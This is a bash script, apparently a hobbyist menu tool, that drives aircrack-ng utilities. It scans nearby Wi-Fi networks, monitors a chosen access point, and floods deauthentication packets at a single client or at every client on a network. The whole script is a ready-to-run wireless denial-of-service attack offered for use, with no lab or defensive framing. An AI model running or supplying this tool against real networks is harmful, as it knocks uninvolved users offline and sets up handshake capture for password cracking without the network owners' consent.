#!/bin/bash

echo Wi-Fi Deauthentication Tool .. .Smyle| lolcat

display_menu() {  
    echo "------------------------------------"
    echo "Wi-Fi Deauthentication Tool" | lolcat
    echo "1. Scan for Wi-Fi networks"  | lolcat
    echo "2. Select a Wi-Fi network for further actions" | lolcat
    echo "3. Deauthenticate a client from a Wi-Fi network" | lolcat
    echo "4. Deauthenticate all clients from a Wi-Fi network" | lolcat
    echo "5. Check Wi-Fi Adapter Status" | lolcat
    echo "6. Change Wi-Fi Adapter Interface Name" | lolcat
    echo "7. Exit" | lolcat
    echo ""
    echo "Enter your choice:"
    read choice
}

scan_wifi() {
    echo "Scanning for Wi-Fi networks..."
    sudo airodump-ng $wifi_interface
}

select_wifi() {
    echo "Enter the BSSID of the Wi-Fi network:"| lolcat
    read wifi_bssid
    echo "Enter the channel of the Wi-Fi network:"| lolcat
    read channel
    echo "Starting monitoring on the selected network..."| lolcat
    sudo airodump-ng --bssid $wifi_bssid --channel $channel $wifi_interface
}

deauth_client() {
    echo "Enter the number of deauthentication packets to send:"| lolcat
    read deauth_packets
    echo "Enter the BSSID of the Wi-Fi network:"| lolcat
    read wifi_bssid
    echo "Enter the client MAC address to deauthenticate:"| lolcat
    read client_mac
    echo "Sending deauthentication packets..."| lolcat
    sudo aireplay-ng --deauth $deauth_packets -a $wifi_bssid -c $client_mac $wifi_interface
}

deauth_all_clients() {
    echo "Enter the number of deauthentication packets to send:" | lolcat
    read deauth_packets 
    echo "Enter the BSSID of the Wi-Fi network:" |lolcat
    read wifi_bssid
    echo "Sending deauthentication packets to all clients..."|lolcat
    sudo aireplay-ng --deauth $deauth_packets -a $wifi_bssid $wifi_interface 
}

check_wifi() {
    echo "Wi-Fi Adapter Status" | lolcat
    iwconfig $wifi_interface
}

change_interface() {
    echo "Enter the new Wi-Fi adapter interface name:" | lolcat
    read new_interface
    wifi_interface=$new_interface
    echo "Wi-Fi adapter interface name changed to $wifi_interface." | lolcat
}

echo ""

wifi_interface="wlan0"

while true; do
    display_menu

    case $choice in
        1)
            scan_wifi 
            ;;
        2)
            select_wifi
            ;;
        3)
            deauth_client
            ;;
        4)
            deauth_all_clients 
            ;;
        5)
            check_wifi 
            ;;
        6)
            change_interface 
            ;;
        7)
            echo "Exiting..." | lolcat
            break
            ;;
        *)
            echo "Invalid choice. Please try again." | lolcat
            ;;
    esac

    echo
done
